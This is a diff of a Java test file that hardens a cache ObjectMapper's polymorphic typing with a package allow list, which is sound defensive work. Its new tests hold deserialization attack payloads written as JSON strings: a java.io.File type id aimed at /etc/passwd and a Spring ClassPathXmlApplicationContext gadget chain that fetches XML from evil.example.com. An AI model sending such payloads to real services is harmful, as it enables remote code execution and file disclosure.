@@ -6,6 +6,7 @@ import com.fasterxml.jackson.annotation.PropertyAccessor;
 import com.fasterxml.jackson.core.JsonProcessingException;
 import com.fasterxml.jackson.databind.DeserializationFeature;
 import com.fasterxml.jackson.databind.ObjectMapper;
+import com.fasterxml.jackson.databind.exc.InvalidTypeIdException;
 import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
 import com.fasterxml.jackson.datatype.hibernate5.jakarta.Hibernate5JakartaModule;
 import com.fasterxml.jackson.datatype.jdk8.Jdk8Module;
@@ -33,6 +34,7 @@ import java.util.stream.Stream;
 
 import static org.assertj.core.api.Assertions.assertThat;
 import static org.assertj.core.api.Assertions.assertThatCode;
+import static org.assertj.core.api.Assertions.assertThatThrownBy;
 
 /**
  * CacheConfig ObjectMapper 직렬화/역직렬화 왕복 테스트
@@ -52,7 +54,11 @@ class CacheConfigObjectMapperTest {
         ObjectMapper mapper = new ObjectMapper();
         mapper.activateDefaultTyping(
                 BasicPolymorphicTypeValidator.builder()
-                        .allowIfBaseType(Object.class)
+                        .allowIfSubType("com.personal.marketnote.")
+                        .allowIfSubType("java.util.")
+                        .allowIfSubType("java.time.")
+                        .allowIfSubType("java.math.")
+                        .allowIfSubType("java.lang.")
                         .build(),
                 ObjectMapper.DefaultTyping.NON_FINAL,
                 JsonTypeInfo.As.PROPERTY
@@ -275,6 +281,43 @@ class CacheConfigObjectMapperTest {
         // then
         assertThat(deserialized).isInstanceOf(List.class);
         assertThat((List<?>) deserialized).isEmpty();
+    }
+
+    @Test
+    @DisplayName("화이트리스트 외 패키지 클래스(com.example.evil.Foo)는 역직렬화 시 InvalidTypeIdException을 발생시킨다")
+    void unwhitelistedPackage_shouldThrowInvalidTypeIdException() {
+        // given
+        ObjectMapper mapper = createCacheObjectMapper();
+        String maliciousJson = "[\"com.example.evil.Foo\",{\"x\":1}]";
+
+        // when & then
+        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
+                .isInstanceOf(InvalidTypeIdException.class);
+    }
+
+    @Test
+    @DisplayName("화이트리스트 외 표준 라이브러리(java.io.File)는 역직렬화 시 InvalidTypeIdException을 발생시킨다")
+    void javaIoFile_shouldThrowInvalidTypeIdException() {
+        // given
+        ObjectMapper mapper = createCacheObjectMapper();
+        String maliciousJson = "[\"java.io.File\",\"/etc/passwd\"]";
+
+        // when & then
+        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
+                .isInstanceOf(InvalidTypeIdException.class);
+    }
+
+    @Test
+    @DisplayName("알려진 가젯 체인(ClassPathXmlApplicationContext)은 역직렬화 시 InvalidTypeIdException을 발생시킨다")
+    void springGadgetChain_shouldThrowInvalidTypeIdException() {
+        // given
+        ObjectMapper mapper = createCacheObjectMapper();
+        String maliciousJson =
+                "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";
+
+        // when & then
+        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
+                .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
